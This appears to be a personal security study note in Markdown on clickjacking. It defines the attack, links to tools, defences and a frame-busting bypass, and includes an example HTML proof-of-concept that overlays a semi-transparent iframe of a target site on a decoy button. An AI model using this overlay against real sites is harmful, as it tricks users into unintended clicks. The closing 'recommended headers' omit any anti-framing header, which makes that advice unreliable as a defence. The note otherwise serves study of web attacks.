---
tags:
  - security
  - web
aliases:
  - UI Redressing
---
Tricking a user into clicking something different from what the user perceives.
Attackers have their own website, embed a real website as an iframe into their website, add hidden buttons that overlay buttons in the iframe.
# Tools
- [[Clickbandit]]
# Defenses
- [[Frame Busting]]
# Techniques
- [[Frame Busting IFrame Sandbox Bypass]]
# Example HTML
```
<!DOCTYPE html>
<html lang="en">


<head>
	<style>
		#target_website {
			position:relative;
			width:100%;
			height:100vh;
			opacity:0.5;
			z-index:2;
			}
		#decoy_website {
			position:absolute;
			width:300px;
			height:400px;
			z-index:1;
			}
	</style>
</head>

<body>
	<div id="decoy_website">
		<button 
		style=""
>		</button>
	</div>
	<iframe id="target_website" src="https://vulnerable-website.com">
	</iframe>
</body>

</html>
```
Also recommended headers:
```
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-store, max-age=0
```